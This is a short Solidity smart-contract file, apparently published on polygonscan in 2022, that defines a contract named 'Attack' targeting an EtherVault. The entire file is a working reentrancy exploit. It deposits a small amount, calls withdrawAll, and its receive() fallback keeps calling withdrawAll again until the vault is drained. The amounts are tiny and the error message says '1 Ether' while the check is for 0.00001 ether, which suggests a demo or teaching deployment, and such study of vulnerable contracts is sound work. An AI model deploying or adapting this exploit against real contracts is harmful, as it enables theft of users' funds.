/**
 *Submitted for verification at polygonscan.com on 2022-10-09
*/

pragma solidity 0.8.13;

interface IEtherVault {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attack {
    IEtherVault public immutable etherVault;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }
    
    receive() external payable {
        if (address(etherVault).balance >= 0.00001 ether) {
            etherVault.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value == 0.00001 ether, "Require 1 Ether to attack");
        etherVault.deposit{value: 0.00001 ether}();
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}